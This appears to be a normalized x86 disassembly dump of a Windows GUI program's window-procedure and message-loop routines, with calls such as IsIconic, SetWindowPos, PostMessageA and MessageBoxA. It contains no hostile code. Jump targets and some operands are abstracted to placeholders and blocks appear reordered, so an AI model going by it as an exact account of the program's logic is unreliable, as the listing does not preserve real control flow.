mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45ea0c
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45fc78
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_417570
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_4464d0
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_460bf4
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45f794
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45f738
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_4464d0
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f25c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_45e010
push ebp
call sub_45ead0
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45ead0
pop ecx
jmp [ eax * 4 + jump_table_45ebfc ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_4464d0
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45f610
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_44ade4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45ea64
push ebp
call sub_45ead0
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45ead0
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45ead0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41cef8
jmp r-xdata
xor eax eax
call sub_456988
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_4464d0
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_440e64
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f278
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45ead0
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_45c210
jmp r-xdata
push ebp
call sub_45ead0
pop ecx
jmp r-xdata
push ebp
call sub_45eb0c
pop ecx
jmp r-xdata
push ebp
call sub_45ead0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e970
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f328
jmp r-xdata
jmp r-xdata
call sub_433194
call sub_433274
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e960
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e970
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e968
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_456838
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45ead0
pop ecx
jmp r-xdata
call sub_4568ec
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45ead0
pop ecx
jmp r-xdata
call sub_433194
call sub_4332d0
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d258
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45f278
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45e960
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45e290
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_4464d0
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_4464d0
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_45f328
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45e290
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_4464d0
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45e970
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_4464d0
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_459f9c
mov eax [ ebx + 0x44 ]
call sub_45c3b8
sub_45f428
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45f464
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_40408c
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404128
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45f4b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45f4d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45f524
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43cb90
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_4464d0
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_45f5dc
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_46053c
sub_45f610
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_4464d0
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_4034e4
test al al
jne r-xdata
sub_45f67c
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_45f5dc
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45f4d4
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45f524
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45f4b0
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_45f714
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45f67c
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_45ffe4
sub_45f738
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_417550
mov eax 0x8
call sub_40276c
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_417414
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45f794
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_417570
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_40278c
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_417460
jmp r-xdata
sub_45f828
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_45f866
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_4464ac
mov [ esi + 0x44 ] edi
sub_45f8a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45f986
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_4567b0
call sub_407e80
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f98d
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_459f9c
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_45f94d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45f714
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_458ea4
mov eax [ ebp - 0x4 ]
call sub_45f278
jmp r-xdata
sub_45f9a8
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_4027fc
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40281c
push eax
call sub_4027fc
pop edx
call sub_40b704
call sub_4027fc
mov edx [ rw-data ]
call sub_403474
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_4027fc
mov edx eax
mov eax ebx
call sub_45fba0
pop esi
pop ebx
retn
call sub_4027fc
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_45fa38
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_456838
mov [ ebp - 0x10 ] eax
call sub_456754
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_45e9dc
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_45fb8d
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fb94
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_4568ec
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_45675c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_45fba0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45fc5b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4040d0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45f464
mov eax [ ebp - 0x108 ]
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
mov edx eax
mov eax ebx
pop ecx
call sub_45fa38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fc62
lea eax [ ebp - 0x108 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
call sub_408674
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402df0
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402c08
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404300
sub_45fc78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_44666c
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_4467d4
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_46031c
test al al
je r-xdata
call sub_4464d0
mov ebp eax
mov eax edi
call sub_4464d0
mov ebp eax
mov eax esi
call sub_46031c
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_45fde0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45fe38
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46031c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_460b68
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fe3f
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_45fe48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45fea0
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46031c
test al al
je r-xdata
xor ebx ebx
